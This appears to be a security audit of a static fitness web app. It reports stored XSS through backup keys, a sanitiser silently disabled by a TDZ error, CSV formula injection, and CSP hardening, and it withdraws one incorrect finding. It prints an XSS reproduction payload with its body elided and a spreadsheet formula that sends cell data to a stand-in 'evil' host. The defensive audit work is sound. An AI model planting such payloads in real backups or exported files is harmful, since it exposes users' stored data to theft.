# Security Audit — Fitness Forge

**Date:** 2026-10-25 · **Scope:** the whole client-side app (no server exists)
**Method:** source review plus exploitation in headless Chromium. Every finding
below marked *confirmed* was reproduced by running the app, not by reading it.

Fitness Forge is a static, client-side PWA on GitHub Pages. There is no backend,
no account and no transmitted data, so the threat model is narrow and specific:

1. A **file the user is given** — a JSON backup or a third-party CSV — is the only
   untrusted input of any size. The app is built to import both.
2. Anything that executes in this origin can read **every workout, bodyweight,
   measurement and note** the user has stored, and send it anywhere.
3. Third-party media is hotlinked from raw.githubusercontent.com and YouTube.

---

## Findings

| # | Severity | Finding | Status |
|:--|:--|:--|:--|
| 1 | **Critical** | Stored XSS via unsanitised state **keys** in a restored backup | Fixed |
| 2 | **Critical** | The boot-time sanitiser was silently disabled by a TDZ error | Fixed |
| 3 | Moderate | Backup restore trusted the entire parsed object | Fixed |
| 4 | Moderate | CSV export formula injection | Fixed |
| 5 | Low | No Content-Security-Policy | Added |
| 6 | Low | No referrer policy | Added |
| 7 | ~~Low~~ | ~~Service worker caches third-party media without bound~~ | **Withdrawn — incorrect** (see below) |

---

### 1. Stored XSS via state keys — **critical, confirmed**

`v3.30` closed XSS by cleaning free text at the few doors it enters through
(`cleanText` in `store.js`). That doctrine is sound, but it only ever covered
**values**. Two pieces of state are **maps keyed by exercise id**:

```js
prs:             { exId: { weight, reps, date, e1rm } }
customExercises: { exId: { name, muscle, … } }
```

and those keys are interpolated straight into single-quoted inline handlers:

```js
onclick="openExDetail('${exId}')"        // achievements.js, analytics.js, library.js
```

A key is not free text, so it was never cleaned — and `cleanText` would not have
saved this anyway, because it deliberately preserves apostrophes, which is all
that is needed to break out of a single-quoted handler. Keys were untouched
entirely, so `<`, `>` and `"` survived too, allowing full tag injection.

**Reproduction.** A backup containing

```json
{ "onboarded": true,
  "prs": { "\"><img src=x onerror=\"…\">": { "weight": 225, "reps": 5 } } }
```

executed **on load, before any navigation**, and injected tags on the
Achievements, Analytics, Library, Dashboard and Progress pages — measured 2
executions and 2–3 injected `<img>` elements per page.

This is a realistic delivery path: a backup is a file a user can be sent and
invited to restore.

**Fix.** Ids are validated, not cleaned — every one of the 1077 ids in the
library is `[A-Za-z0-9_]` and at most 61 characters, so anything else did not
come from this app. `pruneIdMap()` drops non-conforming keys, applied both to the
restore path and to the boot scrub (so a payload already in storage from an
earlier restore stops firing). Verified: **0 executions, 0 injected tags** across
all five pages, while a legitimate custom exercise named `Sally's Curl` survives
intact.

### 2. The sanitiser failed silently — **critical, confirmed**

Found while fixing #1, and arguably worse than it. The boot scrub ends in:

```js
} catch { /* never let a scrub failure stop the app booting */ }
```

The first version of the #1 fix called a hoisted function that referenced a
module-level `const` declared 120 lines further down. That is a temporal dead
zone `ReferenceError` — thrown on every single boot, caught, and discarded. **The
security scrub did nothing at all, and every existing test still passed.** It was
only caught because the exploit was re-run against the fix and still fired.

**Fix.** The pattern is inlined so no TDZ exists, and the catch now reports:
`console.error('[forge] boot scrub failed — stored data may not be sanitised')`.
A sanitiser that can fail quietly is not a sanitiser.

### 3. Restore trusted the whole object — **moderate, confirmed**

`importData` wrote the parsed JSON **verbatim** to `localStorage` and reloaded.
Beyond #1 this meant arbitrary extra fields on a custom exercise were merged into
the shared `EXERCISES` map — an `imgKey` of `" onerror="…` lands inside the
double-quoted `src` of every thumbnail built for it — and unknown top-level keys
were persisted.

**Fix.** `sanitizeBackup()` reduces a restored file to the 23 top-level keys this
app writes and reduces each custom-exercise record to the fields it actually
sets. Confirmed end-to-end through the real file input: hostile keys dropped,
unknown keys dropped, nothing executed.

### 4. CSV export formula injection — **moderate**

Exported cells were correctly quoted and doubled, but quoting does not stop Excel
or Sheets evaluating a cell whose text begins with `=`, `+`, `-` or `@`. A note of
`=HYPERLINK("http://evil/?"&A1,"click")` runs when the file is opened. Notes are
usually the user's own, but they can also arrive from an imported backup or a
third-party CSV.

**Fix.** Such cells are prefixed with `'`. Verified in the exported blob.

### 5–6. CSP and referrer policy — **low, hardening**

Neither existed. A CSP is now set via `<meta>`.

**It is honest about its limits:** the app uses inline `onclick` handlers
throughout, so `script-src` must include `'unsafe-inline'` and the policy cannot
stop script injection by itself. What it does is cut off what injected script
could *do*: `connect-src 'self'` blocks fetch/XHR/beacon/WebSocket to any other
host — and the app makes **no network calls of its own**, so this costs nothing —
`img-src` is a whitelist so a pixel cannot carry data out, and
`object-src 'none'` / `base-uri 'self'` / `form-action 'none'` close the usual
remaining routes. `frame-ancestors` is deliberately absent: it is ignored in a
meta tag and GitHub Pages serves no headers, so clickjacking cannot be addressed
from inside the app.

Verified: **0 CSP violations** across all 22 pages and the YouTube modal, with
the in-app video player still mounting (`script-src` has to allow
`https://www.youtube.com` for `iframe_api`, which the first draft of the policy
broke).

### 7. ~~Unbounded media cache~~ — **withdrawn: this finding was wrong**

*Correction, added after the original audit.* The original text said `sw.js`
caches every successful GET "including hotlinked photos, GIFs and animations",
so the cache could grow into the hundreds of megabytes. **That was reasoned from
the code without being tested, and it is false.**

`sw.js` skips any response whose `type` is `'opaque'`. Every hotlinked image in
this app is a plain `<img>` with no `crossorigin` attribute, which makes a
`no-cors` request, and a cross-origin response to one is opaque. So hotlinked
media has never been cached.

Verified empirically: a full copy of the app under its real `sw.js`, with a
second origin serving two images. The `no-cors` image (how the app loads all of
its media) was **not** cached; a `crossOrigin="anonymous"` image, added only
for contrast, was. The only cross-origin entries the worker can store are CORS
responses — in practice Google Fonts' font files, a small fixed set.

No change is needed, and none was made. One consequence worth knowing, which
the app already handles: because media is never cached, exercise photos and
animations are unavailable offline, and each photo layer removes itself
cleanly rather than showing a broken image.

---

## Checked and found clean

| Area | Result |
|:--|:--|
| Prototype pollution via backup (`__proto__`, `constructor.prototype`) | `Object.prototype` intact — the loader uses spread, which defines own properties rather than invoking the setter |
| Hash router with `#__proto__`, `#constructor`, `#toString` | All fall back to the dashboard; the v3.29 own-property fix holds |
| YouTube id handling | `youtubeId()` validates strictly to `[A-Za-z0-9_-]{11}`, rejecting anything else |
| `eval`, `new Function`, `document.write`, `srcdoc` | None present |
| `target="_blank"` without `rel="noopener"` | None present |
| Supply chain | Chart.js is **vendored locally**, not loaded from a CDN — no third-party script in the critical path |
| Committed secrets | None. `YT_API_KEY` is read from the environment at generation time only and never ships to the browser |
| Numeric input handling | The v3.29 clamps (`clampWeight`/`clampReps`/`clampSeconds`) still gate every path that records a set |

## Accepted by design

Health data — bodyweight, measurements, notes — is stored unencrypted in
`localStorage`. For an offline-first app with no account this is the expected
trade-off: there is no key to protect it with that would not also live on the
device. Anyone with access to the unlocked device or browser profile can read it.
